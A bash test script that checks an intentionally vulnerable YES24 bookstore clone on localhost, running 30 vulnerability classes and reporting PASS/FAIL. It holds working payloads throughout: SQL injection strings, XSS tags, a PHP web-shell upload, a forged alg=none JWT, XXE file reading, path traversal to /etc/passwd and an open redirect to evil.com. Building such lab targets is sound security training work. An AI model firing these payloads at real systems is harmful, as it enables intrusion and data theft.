#!/usr/bin/env bash
# YES24 Clone — Comprehensive Vulnerability Test Script
# Tests all B1-B30 intentional vulnerabilities and reports PASS/FAIL
set -euo pipefail

BASE_URL=${BASE_URL:-http://localhost}
BASE="$BASE_URL/api/v1"
PASS=0
FAIL=0
TOTAL=0

green() { printf "\033[32m%s\033[0m" "$1"; }
red()   { printf "\033[31m%s\033[0m" "$1"; }
bold()  { printf "\033[1m%s\033[0m" "$1"; }

check() {
    local name="$1" result="$2" expect="$3"
    TOTAL=$((TOTAL + 1))
    if echo "$result" | grep -q "$expect"; then
        PASS=$((PASS + 1))
        printf "  [$(green PASS)] %s\n" "$name"
        echo "         Response snippet: $(echo "$result" | head -c 120)"
    else
        FAIL=$((FAIL + 1))
        printf "  [$(red FAIL)] %s\n" "$name"
        echo "         Expected: $expect"
        echo "         Got: $(echo "$result" | head -c 200)"
    fi
    echo
}

echo ""
bold "============================================================"; echo
bold "   YES24 Clone — Vulnerability Test Suite (B1-B30)"; echo
bold "============================================================"; echo
echo "Target: $BASE_URL"
echo ""

# ─── Health Check ──────────────────────────────────────────────────────
bold "--- Health Check ---"; echo
HEALTH=$(curl -s "$BASE_URL/healthz")
check "Health check" "$HEALTH" "ok"

# ─── Register test user & get session ──────────────────────────────────
TS=$(date +%s)
TEST_EMAIL="vulntest_${TS}@test.com"
REGISTER=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"username\":\"testuser_${TS}\",\"password\":\"test1234\"}")

COOKIE=$(echo "$REGISTER" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('id',''))" 2>/dev/null || echo "")

# Login to get session cookie
LOGIN=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"test1234\"}")
SESSION=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
USER_ID=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('user',{}).get('id',''))" 2>/dev/null || echo "")

if [ -z "$SESSION" ]; then
    echo "WARNING: Could not get session token. Some tests may fail."
fi
echo "Test user: $TEST_EMAIL (session: ${SESSION:0:16}...)"
echo ""

# ─── B1: SQL Injection ────────────────────────────────────────────────
bold "--- B1: SQL Injection ---"; echo

R=$(curl -s "$BASE/search/raw?q=' OR 1=1--")
check "[B1.1] SQL Injection - Raw Search (OR 1=1)" "$R" "title"

R=$(curl -s "$BASE/users/lookup?username=' OR '1'='1")
check "[B1.2] SQL Injection - User Lookup" "$R" "email"

R=$(curl -s "$BASE/search?q=test&legacy=1")
check "[B1.3] SQL Injection - Legacy Search Mode" "$R" "items"

# ─── B2: Stored XSS ──────────────────────────────────────────────────
bold "--- B2: Stored XSS ---"; echo

XSS_REG=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"xss_${TS}@test.com\",\"username\":\"<script>alert(1)</script>\",\"password\":\"test1234\"}")
check "[B2.1] XSS in username (register)" "$XSS_REG" "회원가입"

if [ -n "$SESSION" ]; then
    R=$(curl -s -X POST "$BASE/products/100000001/reviews" \
      -H "Content-Type: application/json" \
      -b "ASP.NET_SessionId=$SESSION" \
      -d '{"rating":5,"title":"<img src=x onerror=alert(1)>","content":"<script>alert(\"xss\")</script>"}')
    check "[B2.2] XSS in review content" "$R" "리뷰\|등록"
fi

R=$(curl -s "$BASE/products/100000001/reviews/raw")
check "[B2.3] Raw HTML reviews (XSS rendering)" "$R" "<html>\|html"

# ─── B3: IDOR ────────────────────────────────────────────────────────
bold "--- B3: IDOR ---"; echo

R=$(curl -s "$BASE/orders/1")
check "[B3.1] IDOR - View any order (no auth)" "$R" "order_no\|total_amount\|not found"

R=$(curl -s "$BASE/users/1")
check "[B3.2] IDOR - View any user + password_hash" "$R" "password_hash"

R=$(curl -s -X PUT "$BASE/reviews/1" \
  -H "Content-Type: application/json" \
  -d '{"content":"IDOR test","rating":1}')
check "[B3.3] IDOR - Edit any review (no auth)" "$R" "updated\|수정\|not found"

R=$(curl -s -X DELETE "$BASE/orders/1/cancel")
check "[B3.4] IDOR - Cancel any order (no auth)" "$R" "cancelled\|취소"

# ─── B4: Broken Authentication ────────────────────────────────────────
bold "--- B4: Broken Authentication ---"; echo

for i in 1 2 3 4 5; do
  curl -s -X POST "$BASE/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"wrong${i}\"}" > /dev/null
done
R=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"test1234\"}")
check "[B4.1] No rate limiting (6th attempt succeeds)" "$R" "access_token\|로그인"

R=$(curl -s "$BASE/auth/debug-session?session_id=$SESSION")
check "[B4.2] Debug session info leak" "$R" "user_id\|email"

R=$(curl -s -X POST "$BASE/auth/admin-login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}')
check "[B4.3] Hardcoded admin credentials" "$R" "access_token\|Admin"

R=$(curl -s "$BASE/auth/sessions")
check "[B4.4] Session enumeration" "$R" "sessions\|total"

# ─── B5: Sensitive Data Exposure ──────────────────────────────────────
bold "--- B5: Sensitive Data Exposure ---"; echo

R=$(curl -s "$BASE/config")
check "[B5.1] Config endpoint (DB creds)" "$R" "database_url"

R=$(curl -s "$BASE/search/raw?q='")
check "[B5.2] Stack trace in errors" "$R" "traceback\|error\|Traceback"

R=$(curl -s "$BASE/users/1")
check "[B5.3] Password hash exposure" "$R" "password_hash"

R=$(curl -sI "$BASE_URL/healthz" 2>/dev/null)
check "[B5.4] X-Debug-Info header" "$R" "X-Debug-Info\|X-Powered-By"

# ─── B6: SSRF ────────────────────────────────────────────────────────
bold "--- B6: SSRF ---"; echo

R=$(curl -s -X POST "$BASE/products/fetch-cover" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"$BASE_URL/healthz\"}")
check "[B6.1] SSRF - fetch-cover (local)" "$R" "status_code\|body"

R=$(curl -s -X POST "$BASE/webhooks/notify" \
  -H "Content-Type: application/json" \
  -d "{\"callback_url\":\"$BASE_URL/healthz\",\"data\":{\"test\":1}}")
check "[B6.2] SSRF - webhook notify" "$R" "status_code"

# ─── B7: Insecure File Upload ────────────────────────────────────────
bold "--- B7: Insecure File Upload ---"; echo

echo '<?php system($_GET["cmd"]); ?>' > /tmp/test_shell.php
R=$(curl -s -X POST "$BASE/upload/profile-image" \
  -F "file=@/tmp/test_shell.php" 2>/dev/null || echo '{"error":"minio_unavailable"}')
check "[B7.1] Upload PHP file (no validation)" "$R" "filename\|uploaded\|error"
rm -f /tmp/test_shell.php

# ─── B8: Mass Assignment ─────────────────────────────────────────────
bold "--- B8: Mass Assignment ---"; echo

R=$(curl -s -X PUT "$BASE/users/1" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":true,"point_balance":999999}')
check "[B8.1] Mass assign is_admin + points" "$R" "updated\|fields_updated"

R=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"massassign_${TS}@test.com\",\"username\":\"mass\",\"password\":\"test1234\",\"is_admin\":true}")
check "[B8.2] Register with is_admin=true" "$R" "회원가입"

# ─── B9: Weak Session ────────────────────────────────────────────────
bold "--- B9: Weak Session ---"; echo

R=$(curl -s -X POST "$BASE/auth/login-weak" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"test1234\"}")
check "[B9.1] Weak MD5 session login" "$R" "access_token"

R=$(curl -s "$BASE/auth/token-preview?email=${TEST_EMAIL}")
check "[B9.2] Token prediction" "$R" "predicted_token"

# ─── B10: CSRF — Transfer Points ─────────────────────────────────────
bold "--- B10: CSRF ---"; echo

# Register second user to transfer to
REG2=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"target_${TS}@test.com\",\"username\":\"target\",\"password\":\"test1234\"}")
TARGET_ID=$(echo "$REG2" | python3 -c "import sys,json; print(json.load(sys.stdin).get('user',{}).get('id','2'))" 2>/dev/null || echo "2")

R=$(curl -s -X POST "$BASE/vuln/transfer-points" \
  -H "Content-Type: application/json" \
  -b "ASP.NET_SessionId=$SESSION" \
  -d "{\"to_user_id\":${TARGET_ID},\"amount\":100}")
check "[B10.1] CSRF - Transfer points (no CSRF token)" "$R" "포인트\|전송\|transfer"

# ─── B11: Open Redirect + Info Disclosure ────────────────────────────
bold "--- B11: Open Redirect & Info Disclosure ---"; echo

R=$(curl -s -o /dev/null -w "%{redirect_url}" "$BASE/vuln/redirect?url=https://evil.com/phish")
check "[B11.1] Open Redirect" "$R" "evil.com"

R=$(curl -s -X POST "$BASE/auth/forgot-password" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\"}")
check "[B11.2] Password reset token in response" "$R" "reset_token"

R=$(curl -s -X POST "$BASE/auth/send-verification" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\"}")
check "[B11.3] Verification code in response" "$R" "verification_code"

# ─── B12: Broken Access Control + Command Injection ──────────────────
bold "--- B12: Broken Access Control ---"; echo

R=$(curl -s "$BASE/admin/users" -H "X-Admin: true")
check "[B12.1] Admin users - client-side header bypass" "$R" "email\|username"

R=$(curl -s "$BASE/admin/stats" -H "X-Admin: true")
check "[B12.2] Admin stats - client-side header bypass" "$R" "total_users\|total_orders"

# ─── B13: Command Injection ──────────────────────────────────────────
bold "--- B13: Command Injection ---"; echo

R=$(curl -s "$BASE/vuln/ping?host=127.0.0.1")
check "[B13.1] Command Injection - Ping" "$R" "stdout\|returncode"

R=$(curl -s "$BASE/admin/logs?filter=auth" -H "X-Admin: true")
check "[B13.2] Command Injection - Admin logs filter" "$R" "logs\|auth"

# ─── B14: Path Traversal ─────────────────────────────────────────────
bold "--- B14: Path Traversal ---"; echo

R=$(curl -s "$BASE/vuln/file?path=../../etc/passwd")
check "[B14.1] Path Traversal - /etc/passwd" "$R" "root\|content\|not found\|error"

# ─── B15: ReDoS ──────────────────────────────────────────────────────
bold "--- B15: ReDoS ---"; echo

R=$(curl -s -X POST "$BASE/vuln/validate-email" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaa"}')
check "[B15.1] ReDoS - validate-email (short input)" "$R" "processing_time_ms\|valid"

# ─── B16: JWT None Algorithm ─────────────────────────────────────────
bold "--- B16: JWT None Algorithm ---"; echo

R=$(curl -s -X POST "$BASE/vuln/jwt-login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","role":"admin"}')
check "[B16.1] JWT login (HS256 weak secret)" "$R" "token"

# Forge a JWT with alg=none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"hacker","role":"admin","iat":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED_TOKEN="${HEADER}.${PAYLOAD}."

R=$(curl -s "$BASE/vuln/jwt-profile" \
  -H "Authorization: Bearer ${FORGED_TOKEN}")
check "[B16.2] JWT alg=none bypass" "$R" "hacker\|admin\|role"

# ─── B17: XXE ───────────────────────────────────────────────────────
bold "--- B17: XXE ---"; echo

R=$(curl -s -X POST "$BASE/vuln/xml-parse" \
  -H "Content-Type: application/xml" \
  -d '<order><item>test</item></order>')
check "[B17.1] XXE - XML parse basic" "$R" "order\|item\|tag"

R=$(curl -s -X POST "$BASE/vuln/xml-parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><order><item>&xxe;</item></order>')
check "[B17.2] XXE - Entity resolution" "$R" "tag\|text\|children"

# ─── B18: Insecure Deserialization ──────────────────────────────────
bold "--- B18: Insecure Deserialization ---"; echo

R=$(curl -s "$BASE/vuln/cart/export")
check "[B18.1] Cart export (pickle)" "$R" "data"

# Import the exported cart back
CART_DATA=$(echo "$R" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',''))" 2>/dev/null || echo "")
if [ -n "$CART_DATA" ]; then
    R=$(curl -s -X POST "$BASE/vuln/cart/import" \
      -H "Content-Type: application/json" \
      -d "{\"data\":\"${CART_DATA}\"}")
    check "[B18.2] Cart import (pickle.loads)" "$R" "cart"
else
    check "[B18.2] Cart import (pickle.loads)" "no data" "cart"
fi

# ─── B19: Race Condition ────────────────────────────────────────────
bold "--- B19: Race Condition ---"; echo

R=$(curl -s -X POST "$BASE/vuln/coupon/redeem" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "TEST50", "user_id": 999}')
check "[B19.1] Coupon redeem (single)" "$R" "redeemed\|points_added"

R=$(curl -s -X POST "$BASE/vuln/points/withdraw" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 999, "amount": 100}')
check "[B19.2] Points withdraw" "$R" "Withdrawn\|balance\|Insufficient"

# ─── B20: Business Logic Bypass ─────────────────────────────────────
bold "--- B20: Business Logic Bypass ---"; echo

R=$(curl -s -X POST "$BASE/vuln/order/place" \
  -H "Content-Type: application/json" \
  -d '{"goods_no": 100000001, "quantity": -5, "coupon_discount": 0}')
check "[B20.1] Negative quantity order" "$R" "points_awarded\|total"

R=$(curl -s -X POST "$BASE/vuln/price-check" \
  -H "Content-Type: application/json" \
  -d '{"goods_no": 100000001, "quantity": 999999999}')
check "[B20.2] Price overflow check" "$R" "total"

# ─── B21: CRLF Injection ────────────────────────────────────────────
bold "--- B21: CRLF Injection ---"; echo

R=$(curl -s "$BASE/vuln/set-lang?lang=ko")
check "[B21.1] Set language header" "$R" "language"

R=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/vuln/redirect-log?url=https://yes24.com")
check "[B21.2] Redirect log" "$R" "302"

# ─── B22: Insecure CORS ─────────────────────────────────────────────
bold "--- B22: Insecure CORS ---"; echo

R=$(curl -sI "$BASE/vuln/cors-test" 2>/dev/null)
check "[B22.1] CORS wildcard + credentials" "$R" "access-control-allow-origin\|Access-Control"

# ─── B23: Insecure Direct Function Reference ────────────────────────
bold "--- B23: Direct Function Reference ---"; echo

R=$(curl -s -X POST "$BASE/vuln/admin-action" \
  -H "Content-Type: application/json" \
  -d '{"action": "get_config"}')
check "[B23.1] Admin action - get_config (no auth)" "$R" "secret_key\|db_host\|result"

R=$(curl -s -X POST "$BASE/vuln/admin-action" \
  -H "Content-Type: application/json" \
  -d '{"action": "get_users"}')
check "[B23.2] Admin action - get_users (no auth)" "$R" "email\|username"

# ─── B24: GraphQL Introspection ─────────────────────────────────────
bold "--- B24: GraphQL Introspection ---"; echo

R=$(curl -s -X POST "$BASE/vuln/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}')
check "[B24.1] GraphQL introspection" "$R" "__schema\|types\|User"

R=$(curl -s -X POST "$BASE/vuln/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { id email passwordHash } }"}')
check "[B24.2] GraphQL users query" "$R" "email\|passwordHash\|users"

# ─── B25: Insecure Randomness ───────────────────────────────────────
bold "--- B25: Insecure Randomness ---"; echo

R=$(curl -s -X POST "$BASE/vuln/generate-coupon" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1}')
check "[B25.1] Predictable coupon generation" "$R" "coupon_code\|COUPON"

R=$(curl -s "$BASE/vuln/reset-token?email=test@test.com")
check "[B25.2] Weak reset token (4 digits)" "$R" "reset_token"

# ─── B26: Log Injection ─────────────────────────────────────────────
bold "--- B26: Log Injection ---"; echo

R=$(curl -s -X POST "$BASE/vuln/feedback" \
  -H "Content-Type: application/json" \
  -d '{"message": "test message", "user_agent": "TestBot"}')
check "[B26.1] Log injection - feedback" "$R" "logged"

# ─── B27: Timing Attack ─────────────────────────────────────────────
bold "--- B27: Timing Attack ---"; echo

R=$(curl -s -X POST "$BASE/vuln/check-admin-password" \
  -H "Content-Type: application/json" \
  -d '{"password": "wrong"}')
check "[B27.1] Timing attack - wrong password" "$R" "valid.*false\|false"

R=$(curl -s -X POST "$BASE/vuln/check-admin-password" \
  -H "Content-Type: application/json" \
  -d '{"password": "supersecret2024"}')
check "[B27.2] Timing attack - correct password" "$R" "valid.*true\|true"

# ─── B28: Clickjacking ──────────────────────────────────────────────
bold "--- B28: Clickjacking ---"; echo

R=$(curl -s "$BASE/vuln/iframe-demo")
check "[B28.1] Clickjacking iframe demo" "$R" "iframe\|Clickjack"

# ─── B29: HTTP Method Override ───────────────────────────────────────
bold "--- B29: HTTP Method Override ---"; echo

R=$(curl -s "$BASE/vuln/method-override/resource/1")
check "[B29.1] Method override - GET resource" "$R" "name\|Resource\|id"

R=$(curl -s "$BASE/vuln/method-override/resource/3" \
  -H "X-HTTP-Method-Override: DELETE")
check "[B29.2] Method override - DELETE via GET" "$R" "deleted\|Resource"

# ─── B30: Mass Enumeration ──────────────────────────────────────────
bold "--- B30: Mass Enumeration ---"; echo

R=$(curl -s "$BASE/vuln/user-exists?email=${TEST_EMAIL}")
check "[B30.1] User enumeration (existing)" "$R" "exists.*true\|true"

R=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/vuln/user-exists?email=nonexistent_fake@test.com")
check "[B30.2] User enumeration (404 for missing)" "$R" "404"

R=$(curl -s "$BASE/vuln/order-exists?order_id=1")
check "[B30.3] Order enumeration" "$R" "exists\|not found"

# ─── Summary ──────────────────────────────────────────────────────────
echo ""
bold "==================== SUMMARY ===================="; echo
printf "\n"
printf "  %-45s %s\n" "Category" "Tests"
printf "  %-45s %s\n" "────────────────────────────────────────────" "─────"
printf "  %-45s %s\n" "B1  SQL Injection" "3"
printf "  %-45s %s\n" "B2  Stored XSS" "3"
printf "  %-45s %s\n" "B3  IDOR" "4"
printf "  %-45s %s\n" "B4  Broken Authentication" "4"
printf "  %-45s %s\n" "B5  Sensitive Data Exposure" "4"
printf "  %-45s %s\n" "B6  SSRF" "2"
printf "  %-45s %s\n" "B7  Insecure File Upload" "1"
printf "  %-45s %s\n" "B8  Mass Assignment" "2"
printf "  %-45s %s\n" "B9  Weak Session" "2"
printf "  %-45s %s\n" "B10 CSRF" "1"
printf "  %-45s %s\n" "B11 Open Redirect & Info Disclosure" "3"
printf "  %-45s %s\n" "B12 Broken Access Control" "2"
printf "  %-45s %s\n" "B13 Command Injection" "2"
printf "  %-45s %s\n" "B14 Path Traversal" "1"
printf "  %-45s %s\n" "B15 ReDoS" "1"
printf "  %-45s %s\n" "B16 JWT None Algorithm" "2"
printf "  %-45s %s\n" "B17 XXE" "2"
printf "  %-45s %s\n" "B18 Insecure Deserialization" "2"
printf "  %-45s %s\n" "B19 Race Condition" "2"
printf "  %-45s %s\n" "B20 Business Logic Bypass" "2"
printf "  %-45s %s\n" "B21 CRLF Injection" "2"
printf "  %-45s %s\n" "B22 Insecure CORS" "1"
printf "  %-45s %s\n" "B23 Direct Function Reference" "2"
printf "  %-45s %s\n" "B24 GraphQL Introspection" "2"
printf "  %-45s %s\n" "B25 Insecure Randomness" "2"
printf "  %-45s %s\n" "B26 Log Injection" "1"
printf "  %-45s %s\n" "B27 Timing Attack" "2"
printf "  %-45s %s\n" "B28 Clickjacking" "1"
printf "  %-45s %s\n" "B29 HTTP Method Override" "2"
printf "  %-45s %s\n" "B30 Mass Enumeration" "3"
printf "\n"
echo "  Total:  $TOTAL"
printf "  $(green "PASS"):   %d\n" "$PASS"
printf "  $(red "FAIL"):   %d\n" "$FAIL"
echo ""

if [ "$FAIL" -eq 0 ]; then
    green "All vulnerability tests passed!"; echo
else
    red "$FAIL test(s) failed — check output above."; echo
fi

echo ""
bold "[SUMMARY] $PASS/$TOTAL tests passed"; echo
exit $FAIL
